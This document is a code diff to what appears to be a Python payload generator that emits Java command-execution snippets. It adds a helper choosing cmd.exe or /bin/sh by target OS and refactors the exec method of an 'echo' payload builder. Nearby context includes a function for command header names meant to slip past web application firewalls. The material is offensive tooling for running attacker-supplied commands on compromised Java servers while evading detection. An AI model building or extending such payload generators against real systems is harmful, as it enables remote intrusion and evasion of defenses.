@@ -25,6 +25,41 @@ def java_string_literal(s: str) -> str:
     )
 
 
+def java_os_adaptive_exec(
+    cmd_expr: str = "cmd",
+    *,
+    indent: str = "            ",
+    process_var: Optional[str] = None,
+    wait_for: bool = False,
+) -> str:
+    """生成按目标 OS 选择 shell 的 Runtime.exec 片段。
+
+    ``cmd_expr`` 为 Java String 表达式（变量名如 ``cmd``，或字面量 ``\"id\"``）。
+    Windows → ``cmd.exe /c``；其它 → ``/bin/sh -c``。
+    """
+    ind = indent
+    ind2 = indent + "    "
+    lines = [
+        f"{ind}String[] _cmds;",
+        f"{ind}{{",
+        f'{ind2}String _os = System.getProperty("os.name", "");',
+        f"{ind2}boolean _win = _os.toLowerCase().contains(\"win\");",
+        f"{ind2}_cmds = _win",
+        f'{ind2}    ? new String[]{{"cmd.exe", "/c", {cmd_expr}}}',
+        f'{ind2}    : new String[]{{"/bin/sh", "-c", {cmd_expr}}};',
+        f"{ind}}}",
+    ]
+    if process_var:
+        lines.append(
+            f"{ind}Process {process_var} = Runtime.getRuntime().exec(_cmds);"
+        )
+        if wait_for:
+            lines.append(f"{ind}{process_var}.waitFor();")
+    else:
+        lines.append(f"{ind}Runtime.getRuntime().exec(_cmds);")
+    return "\n".join(lines)
+
+
 def gen_cmd_header(prefix: str = "X-Cmd") -> str:
     """生成较不易被 WAF 误伤的命令头名（可选随机后缀）。"""
     suffix = "".join(random.choices(string.ascii_letters, k=4))
@@ -675,12 +710,14 @@ def build_echo_java_source(
     }}
 
     private static byte[] exec(String cmd) throws Exception {{
-        boolean linux = true;
-        String os = System.getProperty("os.name");
-        if (os != null && os.toLowerCase().contains("win")) linux = false;
-        String[] cmds = linux
-            ? new String[]{{"/bin/sh", "-c", cmd}}
-            : new String[]{{"cmd.exe", "/c", cmd}};
+        String[] cmds;
+        {{
+            String _os = System.getProperty("os.name", "");
+            boolean _win = _os.toLowerCase().contains("win");
+            cmds = _win
+                ? new String[]{{"cmd.exe", "/c", cmd}}
+                : new String[]{{"/bin/sh", "-c", cmd}};
+        }}
         Process p = Runtime.getRuntime().exec(cmds);
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         copyStream(p.getInputStream(), bos);
